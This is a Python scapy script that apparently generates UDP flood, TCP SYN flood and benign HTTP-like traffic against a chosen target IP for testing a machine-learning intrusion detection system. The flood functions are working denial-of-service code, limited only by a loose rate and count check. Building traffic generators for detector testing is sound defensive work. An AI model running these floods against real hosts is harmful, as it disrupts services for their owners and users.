import argparse
import random
import time
from scapy.all import IP, UDP, TCP, send

def udf_flood(target, port, count, rate, payload_size):
    """Send `count` UDP packets to target:port at approximate `rate` packets/sec"""

    delay = 1.0 / rate if rate > 0 else 0
    print(f"[SIM] UDP flood -> {target}:{port} count={count} rate={rate}/sec payload={payload_size}B")

    for i in range(count):
        payload = bytes(random.getrandbits(8) for _ in range(payload_size))
        pkt = IP(dst=target)/UDP(dport=port)/payload
        send(pkt, verbose=False)
        if delay:
            time.sleep(delay)

def tcp_syn_flood(target, port, count, rate):
    """send `count` TCP SYN packets to target:port at approximate `rate` packets/sec"""

    delay = 1.0 / rate if rate > 0 else 0
    print(f"[SIM] TCP SYN flood -> {target}:{port} count={count} rate={rate}pps")

    for i in range(count):
        sport = random.randint(1025, 65535)
        seq = random.randint(0, 2**32-1)
        pkt = IP(dst=target)/TCP(sport=sport, dport=port, flags="S", seq=seq)
        send(pkt, verbose=False)
        if delay:
            time.sleep(delay)

def normal_traffic(target, port, count, rate):
    """Generate `count` normal TCP connections to target:port at approximate `rate` connections/sec"""
    delay = 1.0 / rate if rate > 0 else 0
    print(f"[SIM] Normal traffic -> {target}:{port} count={count} rate={rate}pps")

    for i in range(count):
        sport = random.randint(1025, 65535)
        pkt = IP(dst=target)/TCP(sport=sport, dport=port, flags="PA")/b"GET / HTTP/1.1\r\n\r\n"
        send(pkt, verbose=False)
        if delay:
            time.sleep(delay)



def parse_args():
    p = argparse.ArgumentParser(description="Simulate attack/benign traffic for ML-NIDS testing")
    p.add_argument("mode", choices=["udp_flood", "tcp_syn_flood", "normal_traffic"], help="Traffic type" )
    p.add_argument("--target", required=True, help="Target IP address")
    p.add_argument("--port", type=int, default=9999, help="Destination port")
    p.add_argument("--count", type=int, default=100, help="Number of packets to send")
    p.add_argument("--rate", type=int, default=50, help="Packets per second rate")
    p.add_argument("--payload", type=int, default=64, help="UDP payload size in bytes")
    return p.parse_args()

if __name__ == "__main__":
    args = parse_args()

    # Safety: don't allow hude default rates accidentally
    if args.count > 100000 and args.rate > 1000:
        print("[SIM] Refusing to run extremely large test. Lower count/rate")
        raise SystemExit(1)
    
    if args.mode == "udp_flood":
        udf_flood(args.target, args.port, args.count, args.rate, args.payload)
    elif args.mode == "tcp_syn_flood":
        tcp_syn_flood(args.target, args.port, args.count, args.rate)
    elif args.mode == "normal_traffic":
        normal_traffic(args.target, args.port, args.count, args.rate)